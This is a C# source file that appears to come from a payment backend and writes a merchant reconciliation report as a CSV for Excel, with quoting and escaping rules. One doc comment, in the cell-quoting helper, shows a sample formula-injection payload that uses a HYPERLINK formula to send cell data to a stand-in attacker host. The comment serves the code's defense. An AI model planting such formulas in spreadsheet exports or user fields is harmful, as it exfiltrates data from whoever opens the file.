using System.Globalization;
using System.Text;

namespace FuelFlow.Features.Acquiring.Reconciliation;

/// <summary>
/// Renders a reconciliation act as CSV, for an accountant to open in a spreadsheet.
/// </summary>
/// <remarks>
/// Every number is written invariantly and the file declares UTF-8 with a BOM, because Excel on
/// Windows decides CSV encoding from the BOM alone - without it the customer's and the company's
/// Cyrillic names arrive as mojibake in the one tool this is actually opened with.
/// </remarks>
public static class StatementReconciliationCsv
{
    public static string Render(StatementReconciliationResponse act)
    {
        var sb = new StringBuilder();

        sb.AppendLine(FormattableString.Invariant(
            $"Reconciliation act,,,,,,"));
        sb.AppendLine(FormattableString.Invariant(
            $"Merchant,{act.Merchant}"));
        sb.AppendLine(FormattableString.Invariant(
            $"Period,{act.FromUtc:yyyy-MM-dd},{act.ToUtc:yyyy-MM-dd}"));
        sb.AppendLine();

        sb.AppendLine("Rows in statement," + FormattableString.Invariant($"{act.StatementRowCount}"));
        sb.AppendLine("Matched," + FormattableString.Invariant($"{act.Summary.MatchedCount}"));
        sb.AppendLine("Amount mismatches," + FormattableString.Invariant($"{act.Summary.MismatchCount}"));
        sb.AppendLine("Unmatched," + FormattableString.Invariant($"{act.Summary.UnmatchedCount}"));
        sb.AppendLine("Refund matches," + FormattableString.Invariant($"{act.Summary.RefundMatchCount}"));
        sb.AppendLine("Matched total UAH," + FormattableString.Invariant($"{act.Summary.MatchedTotalUah:0.00}"));
        // The refunds we issued in the period, beside the matched total and never folded into it.
        // The matched total is gross: it is about matching, and a refund issued in this period can
        // reverse a payment from an earlier one - netting the two would mix the periods in a
        // document someone signs.
        sb.AppendLine("Refunds issued in period," + FormattableString.Invariant($"{act.Summary.IssuedRefundCount}"));
        sb.AppendLine("Refunds issued total UAH," + FormattableString.Invariant($"{act.Summary.IssuedRefundTotalUah:0.00}"));
        sb.AppendLine("Mismatch delta UAH," + FormattableString.Invariant($"{act.Summary.MismatchDeltaUah:0.00}"));
        sb.AppendLine("Unmatched total UAH," + FormattableString.Invariant($"{act.Summary.UnmatchedTotalUah:0.00}"));
        sb.AppendLine();

        // The destination sits BESIDE the reference, not instead of it: the reference is our own
        // echo, which is what ties the row to our invoice, and the destination is what the
        // customer typed - evidence for a dispute, and never a match key.
        sb.AppendLine("StatementId,Status,InvoiceId,Reference,Destination,AcquirerAmount,LocalAmount,OrderId,OrderStatus,AcquirerCreatedAt,Note");

        foreach (var row in act.Rows)
        {
            // A comma inside a quoted field would break the row; so would a quote. Doubling is what
            // RFC 4180 asks for, and every reader that matters understands it.
            sb.AppendLine(string.Join(',', new[]
            {
                Q(row.StatementId),
                Q(row.Status.ToString()),
                Q(row.InvoiceId),
                Q(row.Reference),
                Q(row.Destination),
                N(row.AcquirerAmount),
                N(row.LocalAmount),
                Q(row.OrderReference),
                Q(row.OrderStatus?.ToString()),
                Q(row.AcquirerCreatedAtUtc?.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture)),
                Q(row.Note)
            }));
        }

        if (act.RefundsIssued.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("Refunds we issued in this period");
            sb.AppendLine("RefundId,InvoiceId,OrderId,Amount,IssuedAt,ReversedPaymentAt,Note");
            foreach (var refund in act.RefundsIssued)
            {
                sb.AppendLine(string.Join(',', new[]
                {
                    Q(refund.RefundId.ToString()),
                    Q(refund.InvoiceId),
                    Q(refund.OrderId?.ToString()),
                    N(refund.Amount),
                    Q(refund.IssuedAtUtc.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture)),
                    Q(refund.ReversedPaymentAtUtc?.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture)),
                    Q(refund.Note)
                }));
            }
        }

        if (act.MissingFromStatement.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("Orders we hold that the acquirer did not report");
            sb.AppendLine("OrderId,InvoiceId,Amount,Status,CreatedAt");
            foreach (var missing in act.MissingFromStatement)
            {
                sb.AppendLine(string.Join(',', new[]
                {
                    Q(missing.OrderId.ToString()),
                    Q(missing.InvoiceId),
                    N(missing.Amount),
                    Q(missing.Status.ToString()),
                    Q(missing.CreatedAtUtc.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture))
                }));
            }
        }

        return sb.ToString();
    }

    /// <summary>The byte form actually handed over, BOM included so Excel reads it as UTF-8.</summary>
    public static byte[] RenderBytes(StatementReconciliationResponse act)
    {
        var body = Encoding.UTF8.GetBytes(Render(act));
        var preamble = Encoding.UTF8.GetPreamble();

        var bytes = new byte[preamble.Length + body.Length];
        preamble.CopyTo(bytes, 0);
        body.CopyTo(bytes, preamble.Length);
        return bytes;
    }

    private static string A(decimal? value)
        => value is null ? string.Empty : value.Value.ToString("0.00", CultureInfo.InvariantCulture);

    /// <summary>
    /// One cell of TEXT, quoted for RFC 4180 and defused for a spreadsheet.
    /// </summary>
    /// <remarks>
    /// <para>
    /// A cell that STARTS with <c>=</c>, <c>+</c>, <c>-</c> or <c>@</c> is a FORMULA to a
    /// spreadsheet, and this file is opened in one. The destination is what the customer typed, so
    /// a payer can put <c>=HYPERLINK("http://evil/?d="&amp;A1)</c> there and have the accountant's
    /// Excel fetch it the moment the file is opened.
    /// </para>
    /// <para>
    /// The apostrophe is Excel's own "this is text" marker: the cell shows what the payer typed,
    /// and the spreadsheet drops the marker when it reads the value back.
    /// </para>
    /// <para>
    /// The money does not come through here - <see cref="N"/> writes it - because a negative amount
    /// is a number and not a formula, and the marker would turn the cell into text.
    /// </para>
    /// </remarks>
    private static string Q(string? value)
    {
        var text = value ?? string.Empty;

        if (text.Length > 0 && (text[0] is '=' or '+' or '-' or '@'))
            text = "'" + text;

        return "\"" + text.Replace("\"", "\"\"") + "\"";
    }

    /// <summary>
    /// One cell of money, quoted like any other cell and never defused.
    /// </summary>
    /// <remarks>
    /// A spreadsheet reads a quoted number as a number - but only for as long as nothing says it is
    /// text. The marker would make the cell text, and a money column the accountant cannot sum is
    /// a money column that gets added up by hand.
    /// </remarks>
    private static string N(decimal? value) => "\"" + A(value) + "\"";
}
